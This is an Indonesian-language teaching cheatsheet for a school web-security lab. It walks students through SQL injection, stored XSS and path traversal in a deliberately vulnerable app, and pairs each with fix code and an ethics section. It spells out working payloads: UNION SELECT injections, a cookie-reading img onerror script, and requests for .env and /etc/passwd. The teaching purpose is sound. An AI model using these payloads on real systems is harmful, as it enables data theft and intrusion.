# 🔓 Cheatsheet Praktikum Keamanan Aplikasi Web — XI TKJ 3

Aplikasi ini SENGAJA dibuat dengan 3 kerentanan untuk bahan praktikum.
Gunakan panduan ini hanya di lingkungan lab/lokal milik sendiri.

Jalankan aplikasi dulu (lihat README.md), lalu ikuti langkah-langkah di bawah.

---

## 1. SQL Injection (SQLi)

**Lokasi kode**: `app/api/students/search/route.js`
**Endpoint**: `GET /api/students/search?q=...`
**Masalah**: query disusun dengan string concatenation, bukan parameterized query.

### Langkah pengujian

1. Uji dasar — cari siswa normal:
   ```
   GET /api/students/search?q=Davin
   ```

2. Uji tanda kutip tunggal untuk memicu error SQL (indikasi SQLi):
   ```
   GET /api/students/search?q='
   ```
   Perhatikan pesan error pada response JSON (`error` & `debug_query`) — ini
   membocorkan struktur query.

3. Bypass filter pencarian dengan tautologi (`OR '1'='1`):
   ```
   GET /api/students/search?q=x' OR '1'='1
   ```
   Hasil: seluruh data siswa ikut muncul walau nama tidak cocok.

4. Union-based SQLi untuk mengekstrak kolom tambahan (contoh mengambil versi DB):
   ```
   GET /api/students/search?q=x' UNION SELECT 1,version(),3,4,5,6-- -
   ```
   Sesuaikan jumlah kolom (`1,2,3,4,5,6`) dengan jumlah kolom pada `SELECT` asli.

5. Diskusi kelas: kolom apa saja yang bisa "dibocorkan" lewat UNION SELECT jika
   tabel `comments` atau tabel lain ikut di-UNION?

### Mitigasi yang harus diterapkan siswa
Ganti query di `route.js` dengan parameterized query:
```js
const [rows] = await pool.query(
  "SELECT id, full_name, nickname, role_title, expertise, photo_file " +
  "FROM students WHERE full_name LIKE ? ORDER BY full_name ASC",
  [`%${q}%`]
);
```

---

## 2. Cross-Site Scripting (Stored XSS)

**Lokasi kode**: `components/CommentSection.jsx` (rendering) +
`app/api/comments/route.js` (penyimpanan)
**Endpoint**: halaman `/student/[id]`, form komentar
**Masalah**: komentar dirender dengan `dangerouslySetInnerHTML` tanpa sanitasi.

### Langkah pengujian

1. Buka halaman profil siswa mana pun, misalnya `/student/1`.
2. Pada form komentar, isi nama bebas dan komentar dengan payload berikut:
   ```html
   <img src=x onerror="alert('XSS oleh ' + document.cookie)">
   ```
   atau
   ```html
   <script>alert('Stored XSS berhasil')</script>
   ```
   *(Catatan: beberapa browser modern memblokir eksekusi `<script>` yang
   disisipkan lewat innerHTML — payload `onerror` pada tag `<img>` lebih andal
   untuk demonstrasi.)*
3. Kirim komentar, lalu refresh halaman — payload akan tereksekusi setiap kali
   halaman dimuat karena tersimpan permanen di tabel `comments`.
4. Diskusi kelas: bagaimana payload ini bisa dipakai untuk mencuri cookie/session
   pengunjung lain yang membuka halaman yang sama?

### Mitigasi yang harus diterapkan siswa
- Jangan gunakan `dangerouslySetInnerHTML` untuk data dari pengguna — cukup
  render sebagai teks biasa (`{c.content}`), React akan otomatis melakukan
  escaping.
- Jika HTML terbatas memang dibutuhkan, gunakan library sanitasi seperti
  `DOMPurify` sebelum render.
- Tambahkan header `Content-Security-Policy` sebagai lapisan mitigasi tambahan.

---

## 3. Path Traversal / Local File Inclusion (LFI)

**Lokasi kode**: `app/api/avatar/route.js`
**Endpoint**: `GET /api/avatar?file=...`
**Masalah**: parameter `file` digabung langsung ke path tanpa validasi/whitelist.

### Langkah pengujian

1. Uji dasar — ambil foto siswa normal:
   ```
   GET /api/avatar?file=student1.jpg
   ```

2. Baca file "rahasia" yang sengaja disediakan sebagai target latihan
   (`lab-rahasia.txt`, terletak 2 folder di atas `public/students`):
   ```
   GET /api/avatar?file=../../lab-rahasia.txt
   ```
   Jika berhasil, kamu akan melihat flag `TKJ3{path_traversal_berhasil_dieksploitasi}`.

3. (Opsional, sesuaikan environment) Coba baca file konfigurasi environment:
   ```
   GET /api/avatar?file=../../.env
   ```

4. (Opsional, hanya jika di dalam container Linux) Coba baca file sistem:
   ```
   GET /api/avatar?file=../../../../../../etc/passwd
   ```

### Mitigasi yang harus diterapkan siswa
```js
import path from "path";

const safeName = path.basename(file); // buang seluruh komponen direktori
const targetPath = path.join(STUDENTS_DIR, safeName);

// Pastikan hasil akhir tetap di dalam STUDENTS_DIR
const resolved = path.resolve(targetPath);
if (!resolved.startsWith(path.resolve(STUDENTS_DIR))) {
  return NextResponse.json({ error: "Akses ditolak" }, { status: 403 });
}
```
Idealnya, kombinasikan dengan whitelist ekstensi file (`.jpg`, `.png`, dll).

---

## Etika & Aturan Penggunaan

- Semua teknik di atas **hanya** boleh dipraktikkan pada aplikasi ini, yang
  berjalan di lingkungan lokal/lab milik sendiri.
- Jangan pernah menerapkan teknik serupa pada website atau sistem milik orang
  lain tanpa izin tertulis — hal itu melanggar hukum (UU ITE di Indonesia dan
  undang-undang serupa di negara lain).
- Tujuan praktikum ini adalah memahami *bagaimana* kerentanan muncul dan
  *bagaimana* cara memperbaikinya (secure coding), bukan untuk merugikan pihak
  lain.
